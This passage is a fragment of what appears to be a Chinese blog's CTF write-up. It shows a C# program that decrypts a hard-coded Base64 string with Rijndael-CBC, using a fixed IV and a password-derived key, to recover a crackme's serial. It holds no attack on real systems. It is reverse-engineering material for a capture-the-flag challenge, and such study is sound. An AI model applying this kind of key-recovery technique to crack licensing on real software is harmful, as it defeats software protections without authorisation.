class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">using System;</span><br><span class=\"line\">using System.Collections.Generic;</span><br><span class=\"line\">using System.IO;</span><br><span class=\"line\">using System.Linq;</span><br><span class=\"line\">using System.Security.Cryptography;</span><br><span class=\"line\">using System.Text;</span><br><span class=\"line\">using System.Threading.Tasks;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace ConsoleApplication1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    class Program</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public static string detest(string A_0, string A_1)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            byte[] bytes = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;);</span><br><span class=\"line\">            byte[] bytes2 = Convert.FromBase64String(A_0);</span><br><span class=\"line\">            byte[] bytes3 = new PasswordDeriveBytes(A_1, null).GetBytes(32);</span><br><span class=\"line\">            ICryptoTransform transform = new RijndaelManaged</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Mode = CipherMode.CBC</span><br><span class=\"line\">            &#125;.CreateDecryptor(bytes3, bytes);</span><br><span class=\"line\">            MemoryStream memoryStream = new MemoryStream();</span><br><span class=\"line\">            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);</span><br><span class=\"line\">            cryptoStream.Write(bytes2, 0, bytes2.Length);</span><br><span class=\"line\">            cryptoStream.FlushFinalBlock();</span><br><span class=\"line\">            byte[] inArray = memoryStream.ToArray();</span><br><span class=\"line\">            memoryStream.Close();</span><br><span class=\"line\">            cryptoStream.Close();</span><br><span class=\"line\">            return System.Text.Encoding.Default.GetString(inArray);</span><br><span class=\"line\">          //  return Convert.ToString(inArray);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        static void Main(string[] args)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(&quot;Please Input Serial:&quot;);</span><br><span class=\"line\">            Console.WriteLine( detest(&quot;4RTlF9Ca2+oqExJwx68FiA==&quot;, &quot;Kanxue2019&quot;));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","prev":{"title":"Hack The Box Popcorn","slug":"Hack-The-Box-Popcorn"},"next":{"title":"使用frida进行android的hook","slug":"使用frida进行android的hook"},"link":"https://foyjog.github.io/post/看雪ctf第一赛季部分题目writeup/"}